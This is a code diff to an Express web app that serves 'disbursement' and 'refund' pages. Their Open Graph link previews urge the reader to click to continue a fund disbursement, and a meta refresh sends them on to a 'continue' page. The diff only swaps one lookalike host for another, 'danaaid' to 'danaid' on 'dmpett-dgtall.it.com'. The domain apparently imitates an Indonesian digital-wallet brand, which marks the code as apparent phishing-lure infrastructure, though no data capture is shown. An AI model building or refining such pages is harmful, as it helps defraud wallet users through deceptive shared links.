@@ -524,9 +524,9 @@ app.get("/pencairan/:nmrx", async (req, res) => {
 
 <meta property="og:title" content="PENCAIRAN ${nmrx}">
 <meta property="og:description" content="Klik untuk melanjutkan proses pencairan dana Anda.">
-<meta property="og:image" content="https://danaaid.dmpett-dgtall.it.com/assets/preview-pencairan.jpg">
+<meta property="og:image" content="https://danaid.dmpett-dgtall.it.com/assets/preview-pencairan.jpg">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://danaaid.dmpett-dgtall.it.com/pencairan/${nmrx}">
+<meta property="og:url" content="https://danaid.dmpett-dgtall.it.com/pencairan/${nmrx}">
 
 <meta http-equiv="refresh" content="0;url=/pencairan/${nmrx}/lanjut">
 
@@ -731,7 +731,7 @@ app.get("/pengembalian/:phone/:nominal", (req, res) => {
         "Informasi Pengembalian Dana";
 
     const image =
-        "https://danaaid.dmpett-dgtall.it.com/assets/preview-pengembalian.jpg";
+        "https://danaid.dmpett-dgtall.it.com/assets/preview-pengembalian.jpg";
 
     const pageUrl =
         `${req.protocol}://${req.get("host")}${req.originalUrl}`;
